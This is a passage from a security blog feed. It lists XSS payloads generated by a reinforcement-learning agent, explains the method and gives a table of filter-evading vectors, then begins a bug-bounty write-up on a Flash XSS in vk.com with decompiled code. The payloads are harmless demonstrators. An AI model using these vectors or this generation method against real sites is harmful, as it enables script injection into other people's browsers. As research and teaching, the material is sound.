&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;popup=1;&amp;#39;&lt;/span&gt;&lt;span class="na"&gt;onerror&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;x&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;autofocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;x&lt;/span&gt; &lt;span class="na"&gt;onchange&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;import&amp;#39;&lt;/span&gt;&lt;span class="na"&gt;onfocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span class="na"&gt;onfocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;canvas&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;popup=1;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;embed&lt;/span&gt; &lt;span class="na"&gt;onfocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;popup=1;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt;
&lt;span class="err"&gt;&amp;lt;&lt;/span&gt;&lt;span class="na"&gt;form&lt;/span&gt; &lt;span class="na"&gt;formaction&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;object&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="c"&gt;&amp;lt;!-- Involves a click on object --&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;x&amp;#39;&lt;/span&gt;&lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;select&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;frameset&lt;/span&gt; &lt;span class="na"&gt;id&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;frameset&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;iframe&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;img&lt;/span&gt; &lt;span class="na"&gt;srcset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="na"&gt;onerror&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;onfocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="na"&gt;autofocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;srcset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;x&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;x&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;link&lt;/span&gt; &lt;span class="na"&gt;rel&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;import&lt;/span&gt; &lt;span class="na"&gt;href&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;data:text/html;base64,PHNjcmlwdD5wb3B1cD0xOzwvc2NyaXB0Pg==&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="c"&gt;&amp;lt;!-- This is awesome --&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;object&lt;/span&gt; &lt;span class="na"&gt;onfocus&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;select&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;popup=1;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;select&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;source&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt; &lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;frameset&lt;/span&gt;&lt;span class="err"&gt;/&lt;/span&gt;&lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;  &lt;span class="c"&gt;&amp;lt;!-- Interesting as, agent was trying to find vector with no user interaction and only two allowed spaces in input --&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;svg&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;svg&lt;/span&gt; &lt;span class="na"&gt;onload&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;video&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Introduction&lt;/h3&gt;
&lt;p&gt;Let's talk about XSS first. How are you successful in creating a payload for demoing/exploiting a Cross Site Scripting vulnerability? It depends on your
ability to understand the HTML markup and inject a javascript statement in an executional context. If you think about it, your most basic payload starts from
&lt;code&gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt; to &lt;code&gt;&amp;lt;img src=x onerror='alert()'&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;h3&gt;Reinforcement Learning&lt;/h3&gt;
&lt;p&gt;A branch of machine learning in which an agent learns optimum actions for different scenarios based on it's past experiences. A more elegant way of explaining
RL is taken from &lt;a href="http://www.cse.unsw.edu.au/~cs9417ml/RL1/introduction.html"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;An RL agent learns by interacting with its environment and observing the results of these interactions. This mimics the fundamental way in which
humans (and animals alike) learn. As humans, we have a direct sensori-motor connection to our environment, meaning we can perform actions and witness
the results of these actions on the environment. The idea is commonly known as "cause and effect", and this undoubtedly is the key to building up
knowledge of our environment throughout our lifetime. The "cause and effect" idea can be translated into the following steps for an RL agent:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The agent observes an input state&lt;/li&gt;
&lt;li&gt;An action is determined by a decision making function (policy)&lt;/li&gt;
&lt;li&gt;The action is performed&lt;/li&gt;
&lt;li&gt;The agent receives a scalar reward or reinforcement from the environment&lt;/li&gt;
&lt;li&gt;Information about the reward given for that state / action pair is recorded&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;By performing actions, and obersving the resulting reward, the policy used to determine the best action for a state can be fine-tuned.
Eventually, if enough states are observed an optimal decision policy will be generated and we will have an agent that performs perfectly in
that particular environment.&lt;/p&gt;
&lt;h3&gt;Idea&lt;/h3&gt;
&lt;p&gt;Consider the following markup &lt;code&gt;&amp;lt;div class="INJECTION_POINT"&amp;gt;&lt;/code&gt;. By a simple look you are aware that inorder to execute an XSS you come out of the
class attribute context and put a payload. A simple vector in the above scenario is &lt;code&gt;"&amp;gt;&amp;lt;img src=x onerror=alert()&amp;gt;&lt;/code&gt;. This is very trivial because
of your exposure to HTML markup, so I believed that if I can somehow impart the knowledge of html to an RL agent and let it play with it for few hours,
it should be able to provide some simple XSS payloads in different scenarios.&lt;/p&gt;
&lt;p&gt;So, for the same scenario above, the RL agent get a state representation like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;_tag&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;div&lt;/span&gt;
&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;_tag_ap&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt;
&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;attr_value&lt;/span&gt;
&lt;span class="n"&gt;context&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If the above state representation doesn't make any sense, just ignore it. All it does is try to represent the markup. Now, when I tried it against the
agent that I trained, I got the following payload&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;div&lt;/span&gt; &lt;span class="na"&gt;class&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="na"&gt;onclick&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;popup=1;&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Not an optimized payload, as a matter of fact this infact requires user interaction. But this is a good starting point.&lt;/p&gt;
&lt;h3&gt;Simplifications&lt;/h3&gt;
&lt;p&gt;You can just give the set of alphabets and control characters (i.e ',",&amp;lt;,&amp;gt; etc.) as actions and the agent will learn valid HTML if you give negative reward
for all non valid markup that it generates. But for the agent to learn html huge training time is required. Similarly, there are other issues which I will not
go into detail but try to explain the simplifications I applied.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;To speedup the training time, instead of giving just alphabets I gave all the html tags, attributes as actions.&lt;/li&gt;
&lt;li&gt;Based on the html parsing, html tags are made available only when the context is a tag name etc..&lt;/li&gt;
&lt;li&gt;Similarly based on the html parsing attributes and their values are made available only when the context needs one of those.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All the simplifications impart the knowledge of structure of html (XML like structure) only.&lt;/p&gt;
&lt;h3&gt;Current State&lt;/h3&gt;
&lt;p&gt;After training for about &lt;strong&gt;3 hours&lt;/strong&gt; with &lt;strong&gt;25 html tags&lt;/strong&gt; and &lt;strong&gt;25 attribute names&lt;/strong&gt;, the agent aquires good level of knowledge. I provided the following injection
sink &lt;code&gt;&amp;lt;button INJECTION_POINT&lt;/code&gt;. Based on different restrictions the agent chooses different actions&lt;/p&gt;
&lt;p&gt;| Conditions | Payload |
| No restrictions | &lt;code&gt;onclick=popup=1;&amp;gt;&lt;/code&gt; |
| No user interaction | &lt;code&gt;&amp;gt;&amp;lt;svg onload='popup=1;'&amp;gt;&lt;/code&gt; |
| No user interaction + No space | &lt;code&gt;&amp;gt;&amp;lt;iframe/onload='popup=1'&amp;gt;&lt;/code&gt; |
| No user interaction + No space + No Quotes | &lt;code&gt;&amp;gt;&amp;lt;iframe/onload=popup=1&amp;gt;&lt;/code&gt; |
| No user interaction + No 'onload' | &lt;code&gt;&amp;gt;&amp;lt;input autofocus='x' onfocus=popup=1;&amp;gt;&lt;/code&gt; |&lt;/p&gt;
&lt;h3&gt;Future Work (Planned so far!)&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Shift to a sparse sampling way to speed up learning.&lt;/li&gt;
&lt;li&gt;If RlPy is not being suited, shift to &lt;a href="http://deeplearning.net/software/theano/"&gt;&lt;strong&gt;Theano&lt;/strong&gt;&lt;/a&gt; and use &lt;a href="http://lasagne.readthedocs.org/en/latest/"&gt;&lt;strong&gt;Lasagne&lt;/strong&gt;&lt;/a&gt;  for neural network to remember the value function.&lt;/li&gt;
&lt;li&gt;A better state representation of only javascript might be interesting to try out. Why? Because AngularJS has a top notch sandbox to test against!!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I am calling this project as &lt;a href="https://github.com/tunnelshade/nightfury"&gt;&lt;strong&gt;Nightfury&lt;/strong&gt;&lt;/a&gt; and planning to write a detailed technical blog post on how this has
been achieved so far. The github repo needs some cleanup, but as of now please bear with this!&lt;/p&gt;</content><category term="tools"></category></entry><entry><title>Interesting flash xss on vk.com</title><link href="https://tunnelshade.in/blog/2015/09/interesting-flash-xss-on-vkcom/" rel="alternate"></link><published>2015-09-30T00:00:00+05:30</published><updated>2015-09-30T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2015-09-30:/blog/2015/09/interesting-flash-xss-on-vkcom/</id><summary type="html">&lt;p&gt;Every time I try a bug bounty program on &lt;strong&gt;HackerOne&lt;/strong&gt;, I first check for flash files on the domains which are in scope. Flash files are always
a good target as far as I am concerned. Approximately three months back, I came across &lt;strong&gt;VK.com&lt;/strong&gt; bug bounty. So, when I â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Every time I try a bug bounty program on &lt;strong&gt;HackerOne&lt;/strong&gt;, I first check for flash files on the domains which are in scope. Flash files are always
a good target as far as I am concerned. Approximately three months back, I came across &lt;strong&gt;VK.com&lt;/strong&gt; bug bounty. So, when I searched for flash files
I came across one file named &lt;strong&gt;photo_uploader_lite.swf&lt;/strong&gt;. So, I opened the file in my browser and the file got downloaded instead of getting played
in the browser. I ran curl to check the response headers and body.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i http://vk.com/swf/photo_uploader_lite.swf

HTTP/1.1 &lt;span class="m"&gt;200&lt;/span&gt; OK
Server: Apache
Date: Wed, &lt;span class="m"&gt;30&lt;/span&gt; Sep &lt;span class="m"&gt;2015&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:14:31 GMT
Content-Type: application/zip
Content-Length: &lt;span class="m"&gt;12189&lt;/span&gt;
Last-Modified: Tue, &lt;span class="m"&gt;21&lt;/span&gt; Jul &lt;span class="m"&gt;2015&lt;/span&gt; &lt;span class="m"&gt;16&lt;/span&gt;:43:33 GMT
Connection: keep-alive
ETag: &lt;span class="s2"&gt;&amp;quot;55ae76b5-2f9d&amp;quot;&lt;/span&gt;
Expires: Sun, &lt;span class="m"&gt;04&lt;/span&gt; Oct &lt;span class="m"&gt;2015&lt;/span&gt; &lt;span class="m"&gt;14&lt;/span&gt;:14:31 GMT
Cache-Control: max-age&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;345600&lt;/span&gt;
Accept-Ranges: bytes
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The file was being served with content type &lt;code&gt;application/zip&lt;/code&gt;. When I saw the first few bytes of the flash files I recognized the &lt;strong&gt;CWS&lt;/strong&gt; file
header which is present for compressed flash files. This flash file will work as expected when embedded using an &lt;em&gt;object&lt;/em&gt; or &lt;em&gt;embed&lt;/em&gt; tag. But for a flash
xss, you cannot embed swf on your domain (No actionscript methods were exposed to JS). At this point of time, I lost hopes but still wanted to
have a look at the decompiled code. The following snippet only consists of the interesting code segments for better readability.&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;package&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// some imports&lt;/span&gt;
    &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;ExternalCall&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Simple&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_arg1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;void&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;Call&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_arg1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Call&lt;/span&gt;&lt;span class="p"&gt;(...&lt;/span&gt; &lt;span class="nx"&gt;_args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;Boolean&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_local2&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_local3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;RegExp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ExternalInterface&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;available&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="nx"&gt;_local2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_args&lt;/span&gt; &lt;span class="nx"&gt;as&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;_local3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/[^().a-z0-9_]/gi&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
                &lt;span class="nx"&gt;_local2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_local2&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_local3&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ExternalInterface&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;call&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;apply&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;_local2&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;package&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// some imports&lt;/span&gt;
    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Main&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="nb"&gt;Sprite&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;Main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;void&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;super&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;stage&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
                &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ADDED_TO_STAGE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_arg1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;Event&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;void&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;mouseMove&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
